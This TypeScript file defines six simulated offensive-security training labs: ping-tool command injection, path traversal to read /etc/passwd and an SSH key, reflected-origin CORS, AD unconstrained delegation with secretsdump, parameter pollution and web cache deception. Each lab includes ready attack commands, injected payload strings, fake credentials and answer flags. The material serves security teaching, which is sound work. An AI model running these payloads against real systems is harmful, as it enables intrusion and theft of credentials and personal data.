import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Six foundational offensive attack classes that, despite being extremely common in real bug bounty
 *  and pentest reports, weren't yet represented as their own dedicated labs on this platform: OS
 *  command injection, path traversal / LFI, CORS misconfiguration, AD unconstrained delegation abuse,
 *  HTTP parameter pollution, and web cache deception. */
export const offensiveFreshAttacksLabs: LabScenario[] = [
  // 1 — Network: OS Command Injection
  {
    id: 'net-command-injection-ping-tool',
    title: 'Network: Command Injection via a Diagnostic Ping Utility',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'Netops-diag09 exposes an internal "network diagnostics" dashboard with a ping-test feature — the kind of ' +
      'convenience tool that shows up in router, NAS, and firewall admin panels everywhere. The backend takes the ' +
      'hostname you submit and concatenates it directly into a shell command instead of passing it as a proper ' +
      'argument, meaning any shell metacharacter you include (;, &&, |, `) runs as a second command with the ' +
      'same privileges as the diagnostics service itself. This exact pattern — an admin "ping/traceroute" box ' +
      'shelling out unsanitized — is the root cause behind dozens of real disclosed CVEs in consumer and ' +
      'enterprise networking gear (D-Link, Netgear, and Zyxel devices among the most frequently cited).',
    objectives: [
      { text: 'nmap -sV 10.10.170.2', why: 'Confirms the diagnostics service and its port before probing it.' },
      { text: 'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8"', why: 'Establishes the expected, benign ping-output response shape before attempting to break it.' },
      {
        text: 'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8;cat /etc/passwd"',
        why: 'The semicolon is a shell command separator — if the backend builds its ping command by string concatenation instead of passing the hostname as a real argument, everything after the ; runs as a second, completely independent command.',
      },
      {
        text: 'Find the dashboard\'s traceroute tool and repeat the technique to leak an internal API key',
        why: 'A real command injection finding rarely stops at reading /etc/passwd for a proof-of-concept — the same dashboard almost always ships more than one diagnostic tool built the same insecure way, and finding a second injectable endpoint is what turns "I can run commands here" into "this whole class of tool on this box is compromised."',
      },
    ],
    hints: [
      'nmap -sV 10.10.170.2',
      'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8"',
      'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8;cat /etc/passwd"',
      'curl "http://10.10.170.2/api/diagnostics/traceroute?host=8.8.8.8;cat /opt/netops-diag/config.yml"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'netops-diag09',
        ip: '10.10.170.2',
        os: 'Ubuntu 22.04 (internal network-ops dashboard)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 2.3 dev server',
            http: {
              '/api/diagnostics/ping?host=8.8.8.8':
                'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
            },
            vulnRoutes: [
              {
                kind: 'command-injection',
                path: '/api/diagnostics/ping',
                param: 'host',
                triggerSubstrings: [';cat /etc/passwd', ';cat/etc/passwd'],
                vulnerableResponse:
                  'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms\n' +
                  'root:x:0:0:root:/root:/bin/bash\nnetops:x:1000:1000::/home/netops:/bin/bash\n' +
                  'flag{command_injection_via_unsanitized_ping_host_param}',
                normalResponse: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms',
              },
              {
                kind: 'command-injection',
                path: '/api/diagnostics/traceroute',
                param: 'host',
                triggerSubstrings: [';cat /opt/netops-diag/config.yml'],
                vulnerableResponse:
                  'traceroute to 8.8.8.8, 30 hops max\n 1  10.10.170.1  0.412 ms\n' +
                  'internal_api_key: "netops-diag-svc-a1b2c3d4e5f6"\ndashboard_admin_password: "N3tw0rkOps2026!"\n' +
                  'flag{command_injection_escalates_to_internal_api_key_leak}',
                normalResponse: 'traceroute to 8.8.8.8, 30 hops max\n 1  10.10.170.1  0.412 ms\n 2  * * *',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Web: Path Traversal / LFI
  {
    id: 'web-path-traversal-log-viewer',
    title: 'Web: Path Traversal to Read Arbitrary Local Files',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Supportdesk11\'s log-viewer feature lets a support agent read named application log files through a ' +
      '?file= parameter — but the backend joins that filename directly onto its logs directory with no ' +
      'validation that the result still lives inside it. Sequences of "../" walk straight back up the directory ' +
      'tree and out the other side, letting the parameter read any file the web process can access. Path ' +
      'traversal is one of the longest-running, most consistently reported bug classes in bug bounty history — ' +
      'it costs nothing to test (just a few "../" characters) and directly reads whatever secrets happen to sit ' +
      'on disk.',
    objectives: [
      { text: 'nmap -sV 10.10.171.2', why: 'Confirms the log-viewer service before probing the file parameter.' },
      { text: 'curl "http://10.10.171.2/logs/view?file=app.log"', why: 'Establishes the expected, in-bounds file-read behavior before attempting to escape the logs directory.' },
      {
        text: 'curl "http://10.10.171.2/logs/view?file=../../../../etc/passwd"',
        why: 'Each "../" walks one directory level up — enough of them from inside the logs directory reaches the filesystem root, then back down into /etc/passwd, proving the parameter isn\'t constrained to the intended directory at all.',
      },
      {
        text: 'Find the attachment-download endpoint and repeat the traversal against the application\'s own SSH private key',
        why: 'Reading /etc/passwd proves the bug exists; reading a private key the application process can access is what turns a path-traversal finding into an actual, usable foothold on the host — the difference bug bounty triage teams look for between "informational" and "critical." A second endpoint built the same insecure way is exactly how real reports escalate from one file read to a full foothold.',
      },
    ],
    hints: [
      'nmap -sV 10.10.171.2',
      'curl "http://10.10.171.2/logs/view?file=app.log"',
      'curl "http://10.10.171.2/logs/view?file=../../../../etc/passwd"',
      'curl "http://10.10.171.2/attachments/download?file=../../../../home/svcaccount/.ssh/id_rsa"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'supportdesk11',
        ip: '10.10.171.2',
        os: 'Ubuntu 22.04 (PHP support-ticket log viewer)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache 2.4.54 (PHP 8.1)',
            http: {
              '/logs/view?file=app.log':
                '[2026-07-10 09:14:02] INFO Ticket #4471 created\n[2026-07-10 09:15:47] INFO Ticket #4471 assigned to agent 7\n[2026-07-10 09:20:03] INFO Ticket #4471 closed',
            },
            vulnRoutes: [
              {
                kind: 'path-traversal',
                path: '/logs/view',
                param: 'file',
                triggerSubstrings: ['../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc%2fpasswd'],
                vulnerableResponse:
                  'root:x:0:0:root:/root:/bin/bash\nsvcaccount:x:1000:1000::/home/svcaccount:/bin/bash\n' +
                  'flag{path_traversal_reads_etc_passwd_via_dotdot_sequences}',
                normalResponse: '{"error":"File not found in logs directory"}',
              },
              {
                kind: 'path-traversal',
                path: '/attachments/download',
                param: 'file',
                triggerSubstrings: ['../../../../home/svcaccount/.ssh/id_rsa'],
                vulnerableResponse:
                  '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFake==\n-----END OPENSSH PRIVATE KEY-----\n' +
                  'flag{path_traversal_escalates_to_ssh_private_key_disclosure}',
                normalResponse: '{"error":"Attachment not found"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Bug Bounty: CORS Misconfiguration
  {
    id: 'bb-cors-misconfiguration-credentials',
    title: 'Bug Bounty: CORS Misconfiguration Leaks Authenticated Session Data',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Accountportal12\'s API reflects whatever Origin header a request sends straight back into the ' +
      'Access-Control-Allow-Origin response header — and pairs it with Access-Control-Allow-Credentials: true. ' +
      'Combined, that tells the browser "any website, using the victim\'s own cookies, may read this response" — ' +
      'the exact opposite of what CORS exists to prevent. A malicious page hosted anywhere can silently fetch an ' +
      'authenticated user\'s own account data the moment they visit it, no phishing of credentials required at ' +
      'all. This is one of PortSwigger Web Security Academy\'s own dedicated vulnerability categories and a ' +
      'frequently paid bug bounty finding for exactly this reason.',
    objectives: [
      { text: 'nmap -sV 10.10.172.2', why: 'Confirms the account API before probing its CORS behavior.' },
      { text: 'curl -i "http://10.10.172.2/api/account/details"', why: 'Establishes the baseline response and headers with no Origin header set at all.' },
      {
        text: 'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/details"',
        why: 'A correctly configured API should either omit Access-Control-Allow-Origin entirely for an untrusted origin, or echo back only an explicit allow-list — reflecting literally any Origin value back, combined with allow-credentials, means a victim\'s browser will let that attacker-controlled page read the response using the victim\'s own session cookie.',
      },
      {
        text: 'Reuse the same forged Origin header against the payment-methods endpoint',
        why: 'A misconfigured CORS header alone is a finding, but proving the same technique reaches an even more sensitive endpoint — stored payment details, not just a name and email — is what turns it into a critical, high-severity report instead of a low one.',
      },
    ],
    hints: [
      'nmap -sV 10.10.172.2',
      'curl -i "http://10.10.172.2/api/account/details"',
      'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/details"',
      'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/payment-methods"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountportal12',
        ip: '10.10.172.2',
        os: 'Ubuntu 22.04 (Node.js account API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            http: {
              '/api/account/details': '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213"}',
              '/api/account/payment-methods': '{"error":"401 Unauthorized"}',
            },
            vulnRoutes: [
              {
                kind: 'cors-misconfig',
                path: '/api/account/details',
                param: 'Origin',
                location: 'header',
                triggerSubstrings: ['attacker-controlled.example'],
                vulnerableResponse:
                  'Access-Control-Allow-Origin: https://attacker-controlled.example\n' +
                  'Access-Control-Allow-Credentials: true\n' +
                  '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213",' +
                  '"note":"flag{cors_misconfig_reflects_origin_with_credentials_allowed}"}',
                normalResponse: '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213"}',
              },
              {
                kind: 'cors-misconfig',
                path: '/api/account/payment-methods',
                param: 'Origin',
                location: 'header',
                triggerSubstrings: ['attacker-controlled.example'],
                vulnerableResponse:
                  'Access-Control-Allow-Origin: https://attacker-controlled.example\n' +
                  'Access-Control-Allow-Credentials: true\n' +
                  '{"cards":[{"last4":"4242","brand":"Visa"}],"note":"flag{cors_misconfig_escalates_to_stored_payment_data}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — Active Directory: Unconstrained Delegation
  {
    id: 'ad-unconstrained-delegation-abuse',
    title: 'AD: Unconstrained Delegation Ticket Theft',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'A phishing foothold already gave you low-privilege domain creds (svcprint:Print2026!). A quick ' +
      'recon sweep of the domain\'s computer objects shows PRINTSRV01 has "Trusted for Delegation" set — an ' +
      'older, unconstrained delegation setting that, whenever a higher-privileged account authenticates to ' +
      'that server for ANY reason (a domain admin mapping a network printer, for instance), causes Windows ' +
      'to cache a full, reusable copy of that account\'s Kerberos TGT in memory on PRINTSRV01 itself. ' +
      'Compromise the delegation-enabled server, and any admin who so much as printed a document from it ' +
      'becomes fully impersonable. This is a well-documented, real technique (MITRE ATT&CK T1187/T1558) and ' +
      'one of the reasons unconstrained delegation has been considered a legacy anti-pattern in AD hardening ' +
      'guidance for years.',
    objectives: [
      { text: 'cat delegation-scan-results.txt', why: 'Confirms which host in the domain has unconstrained delegation enabled before spending effort compromising it specifically.' },
      { text: 'ssh svcprint@10.10.173.2', why: 'The already-phished low-privilege credential is enough to log into the delegation-enabled print server directly — no exploit needed for this first step.' },
      {
        text: 'cat cached-tickets.txt',
        why: 'Because PRINTSRV01 has unconstrained delegation, any admin authenticating to it leaves a fully reusable cached credential behind — reading it is the entire "attack," no cracking or brute-forcing required.',
      },
      {
        text: 'secretsdump jadmin:AdminDeleg2026x@10.10.173.3',
        why: 'The cached Domain Admin credential extracted from PRINTSRV01 works directly against the domain controller — this is what turns "I compromised one file server" into full domain compromise.',
      },
    ],
    hints: [
      'cat delegation-scan-results.txt',
      'ssh svcprint@10.10.173.2 (password: Print2026!)',
      'cat cached-tickets.txt',
      'secretsdump jadmin:AdminDeleg2026x@10.10.173.3',
    ],
    totalFlags: 2,
    attacker: attacker({
      'delegation-scan-results.txt': file(
        'Domain computer objects with TrustedForDelegation=True:\n' +
          '  PRINTSRV01.corp.local (10.10.173.2) — unconstrained delegation, print/file server\n' +
          '(No other computer objects in the domain have this flag set — PRINTSRV01 is the one target.)\n',
      ),
    }),
    network: [
      {
        hostname: 'printsrv01',
        ip: '10.10.173.2',
        os: 'Windows Server 2016 (print/file server, unconstrained delegation enabled)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH for Windows 8.1' }],
        users: [{ username: 'svcprint', password: 'Print2026!' }],
        root: dir({
          home: dir({
            svcprint: dir({
              'cached-tickets.txt': file(
                'klist output (cached Kerberos tickets on this host):\n' +
                  '#0>  Client: jadmin @ CORP.LOCAL   Server: krbtgt/CORP.LOCAL\n' +
                  '     Cached because: jadmin authenticated to PRINTSRV01 at 09:14 today (mapped a network printer)\n' +
                  '     Ticket flags: forwardable, renewable  <-- unconstrained delegation caches the FULL TGT, not just a service ticket\n' +
                  'Extracted equivalent credential for reuse: jadmin:AdminDeleg2026x\n' +
                  'flag{unconstrained_delegation_caches_reusable_domain_admin_tgt}\n',
              ),
            }),
          }),
        }),
      } as HostDef,
      {
        hostname: 'corp-dc01',
        ip: '10.10.173.3',
        os: 'Windows Server 2019 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }],
        users: [{ username: 'jadmin', password: 'AdminDeleg2026x', canDcsync: true }],
        ntdsHashes:
          'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{unconstrained_delegation_to_full_domain_compromise}:::\n' +
          'corp.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Web: HTTP Parameter Pollution
  {
    id: 'web-http-parameter-pollution',
    title: 'HTTP Parameter Pollution: Bypassing a Discount-Code Filter',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Shopfront-checkout13\'s order API validates discount codes with a lightweight filter that only ' +
      'inspects the FIRST occurrence of the discount parameter in the request — but the underlying framework ' +
      'that actually processes the order takes the LAST occurrence when a parameter is duplicated. Submitting ' +
      'the same parameter twice — once with an innocent value the filter approves, once with the real payload ' +
      '— lets the real value slip through untouched. Different frameworks resolve duplicate parameters ' +
      'differently (first-wins, last-wins, or an array of all values), and exactly this first/last mismatch ' +
      'between a validation layer and the application itself is what HTTP Parameter Pollution (HPP) research ' +
      '(popularized by a well-cited 2009 OWASP AppSec paper) exploits.',
    objectives: [
      { text: 'nmap -sV 10.10.174.2', why: 'Confirms the checkout API before testing its parameter handling.' },
      { text: 'curl -X POST -d "discount=NONE" 10.10.174.2/api/checkout/apply-discount', why: 'Establishes the normal, filtered response when only a single, valid-looking value is submitted.' },
      {
        text: 'curl -X POST -d "discount=NONE&discount=STAFF90" 10.10.174.2/api/checkout/apply-discount',
        why: 'The filter approves the first value ("NONE" — nothing suspicious to block), but the checkout engine itself resolves the duplicated parameter to the LAST value submitted — exactly the first/last mismatch HPP abuses, with zero encoding tricks required.',
      },
    ],
    hints: [
      'nmap -sV 10.10.174.2',
      'curl -X POST -d "discount=NONE" 10.10.174.2/api/checkout/apply-discount',
      'curl -X POST -d "discount=NONE&discount=STAFF90" 10.10.174.2/api/checkout/apply-discount',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'shopfront-checkout13',
        ip: '10.10.174.2',
        os: 'Ubuntu 22.04 (Node.js checkout API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 (Node.js checkout backend)',
            http: {},
            vulnRoutes: [
              {
                kind: 'hpp',
                path: '/api/checkout/apply-discount',
                param: 'discount',
                triggerSubstrings: ['staff90'],
                vulnerableResponse:
                  '{"status":"applied","discount_code":"STAFF90","discount_percent":90,' +
                  '"note":"flag{http_parameter_pollution_last_value_wins_bypasses_filter}"}',
                normalResponse: '{"status":"rejected","reason":"Unrecognized or expired discount code"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Bug Bounty: Web Cache Deception
  {
    id: 'bb-web-cache-deception',
    title: 'Bug Bounty: Web Cache Deception Leaks a Personal Account Page',
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      'Accounthub14 sits behind a CDN that caches anything whose URL path ends in a "static" extension like ' +
      '.css or .js — a common performance optimization. Its application backend, though, routes purely on the ' +
      'path PREFIX and ignores whatever comes after it, so a request for /account/profile/x.css still returns ' +
      'the exact same dynamic, fully personalized account page as /account/profile itself. The CDN sees a ' +
      '".css" URL and caches the whole response, personal data included — meaning the next visitor to request ' +
      'that same trick URL, logged in or not, gets served the FIRST victim\'s cached personal data. This is a ' +
      'distinct bug class from web cache poisoning (which manipulates a request to corrupt the cache) — deception ' +
      'is about tricking the cache into storing something it should never have cached at all, and it\'s a real, ' +
      'well-documented category in PortSwigger\'s own web security research.',
    objectives: [
      { text: 'nmap -sV 10.10.175.2', why: 'Confirms the account service before probing its cache behavior.' },
      { text: 'curl "http://10.10.175.2/account/profile"', why: 'Establishes the normal, personalized account response.' },
      {
        text: 'curl "http://10.10.175.2/account/profile/nonexistent.css"',
        why: 'If the backend ignores everything after the path prefix, this "fake static file" URL returns the exact same personal data — proving the origin server itself doesn\'t distinguish it from the real endpoint.',
      },
      {
        text: 'curl "http://10.10.175.2/cache-status?url=/account/profile/nonexistent.css"',
        why: 'Confirms the CDN actually cached that response as if it were a static asset — meaning every subsequent visitor to that exact trick URL, including a completely anonymous one, now receives the first victim\'s personal data straight from cache.',
      },
    ],
    hints: [
      'nmap -sV 10.10.175.2',
      'curl "http://10.10.175.2/account/profile"',
      'curl "http://10.10.175.2/account/profile/nonexistent.css"',
      'curl "http://10.10.175.2/cache-status?url=/account/profile/nonexistent.css"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'accounthub14',
        ip: '10.10.175.2',
        os: 'Ubuntu 22.04 (Node.js account service behind a CDN)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 (Node.js account backend)',
            http: {
              '/account/profile': '{"name":"Priya Nair","email":"priya.nair@meridiancorp.example","phone":"555-0134"}',
              // The origin ignores everything after the path prefix, so this "fake static file" URL
              // returns the exact same personal data as the real endpoint — that's the entire deception,
              // no param/payload needed, just reaching the trick path is proof of the bug.
              '/account/profile/nonexistent.css':
                '{"name":"Priya Nair","email":"priya.nair@meridiancorp.example","phone":"555-0134",' +
                '"note":"flag{web_cache_deception_origin_ignores_fake_static_extension}"}',
            },
            vulnRoutes: [
              {
                kind: 'cache-deception',
                path: '/cache-status',
                param: 'url',
                triggerSubstrings: ['/account/profile/nonexistent.css'],
                vulnerableResponse:
                  '{"cache":"HIT","cached_url":"/account/profile/nonexistent.css","served_to":"anonymous",' +
                  '"body_included":"name=Priya Nair, email=priya.nair@meridiancorp.example",' +
                  '"note":"flag{cdn_cached_personalized_response_as_static_asset}"}',
                normalResponse: '{"cache":"MISS"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
